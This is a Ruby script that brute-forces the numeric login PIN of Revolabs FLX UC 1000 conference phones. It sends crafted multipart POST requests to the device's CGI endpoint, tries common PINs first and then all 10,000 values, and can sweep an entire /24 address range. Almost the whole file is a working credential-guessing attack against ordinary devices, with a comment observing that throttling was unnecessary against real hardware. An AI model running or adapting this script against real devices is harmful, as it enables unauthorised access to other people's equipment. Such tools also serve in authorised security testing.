#!/usr/bin/env ruby
## bf_login.rb - brute force the login for the revolabs flx UC 1000

require 'json'
require 'net/http'
require 'uri'

# return a Net::HTTP::Post request suitable for validating +pin+
def get_request(uri, pin)
  request = Net::HTTP::Post.new(uri.request_uri)
  request['Accept']          = 'application/json, text/plain, */*'
  request['Accept-Encoding'] = 'gzip, deflate'
  request['Accept-Language'] = 'en-US,en;q=0.8'
  request['Connection']      = 'keep-alive'
  request['Content-Type']    = 'multipart/form-data; boundary=---------------------------7da24f2e50046;charset=UTF-8'
  request['Origin']          = sprintf('http://%s', uri.host)
  request['Referer']         = sprintf('http://%s/login', uri.host)
  request['User-Agent']      = 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36'

  # TODO determine necessity of this, given fuzzing, it's probably unnecessary
  request['Cookie'] = sprintf('_ga=GA1.4.595462255.%s', Time.now.to_i)

  body = Array.new

  body << '-----------------------------7da24f2e50046' # this is a magic number: https://stackoverflow.com/questions/37701805/ie11-content-type-false-in-ie11-it-doesnt-work
  body << 'Content-Disposition: form-data; name="file"; filename="temp.txt"' # TODO should look into what happens when we point at a different file..
  body << 'Content-type: plain/text'
  body << '' # newline
  body << sprintf('<properties sys.validate-password="%s"/>', pin)
  body << '-----------------------------7da24f2e50046'

  request.body = body.join("\r\n")
  request
end

# return a Net::HTTP::Response object
def check_pin(url, pin)

  uri  = URI.parse(url)
  http = Net::HTTP.new(uri.host, uri.port)

  request = get_request(uri, pin)
  http.request(request)
end

#
## main()

address   = ARGV.pop
errors    = Array.new
responses = Array.new
output    = sprintf('%s-logs-%s.%s.%s.json', __FILE__, address, Time.now.to_i, $$)

if address.nil?
  puts sprintf('usage: %s <ipaddress/range>', __FILE__)
  puts sprintf('  %s 192.168.1.42', __FILE__)
  puts sprintf('  %s 192.168.1.*', __FILE__)
  exit 1
end

mode = address.match(/^(?:\d{1,3}){3}\.\d{1,3}$/) ? :ip : :range
targets = Array.new

if mode.eql?(:ip)
  targets << address
elsif mode.eql?(:range)
  base = address.split('.')[0..2].join('.')
  1.upto(254) do |octet|
    targets << sprintf('%s.%s', base, octet)
  end
end

_pins = Hash.new
9999.downto(0).to_a each do |i|
  _pins[i] = 1
end

prioritized = [1234, 2546, 1739, 9876, 1425, 4152] # commonly used PINs

# TODO come up with way to generate patterns - keys that are nearby 

# commonly used PINs that follow a pattern
0.upto(9) do |i|
  prioritized << i * 1111
end

# TODO this is broken, once we delete/add, we change the order.. use a set instead? could go poor man hash style..
prioritized.each do |p|
  _pins.delete(p)
end

pins = [ prioritized, _pins.keys ].flatten # hackery

targets.each do |target|

  url = sprintf('http://%s/cgi-bin/cgiclient.cgi?CGI.RequestProperties=', target)
  puts sprintf('url: [%s]', url)

  pins.each do |i|

    pin = sprintf('%04d', i)

    begin
      puts sprintf('  trying pin[%s]', pin)

      response = check_pin(url, pin)
      responses << response

      # <properties sys.validate-password="0"></properties>
      if response.body.match(/1/)
        puts sprintf('INFO: found the pin[%s]', pin)
        break
      end

      # this was necessary when testing against a local server, but not against real devices
      #sleep 1 if (i % 100).eql?(0)

    rescue => e
      puts sprintf('ERROR: something bad happened on pin[%s]: [%s:%s]', pin, e.class, e.message)
      errors << { :exception => e, :pin => pin }
    end

  end
end

# TODO something better here
errors.each do |e|
  puts sprintf('ERROR: pin[%s] trace[%s]', e[:pin], e[:exception])
end

puts sprintf('ERROR: [%d] total errors', errors.size)
exit 1 unless errors.empty?
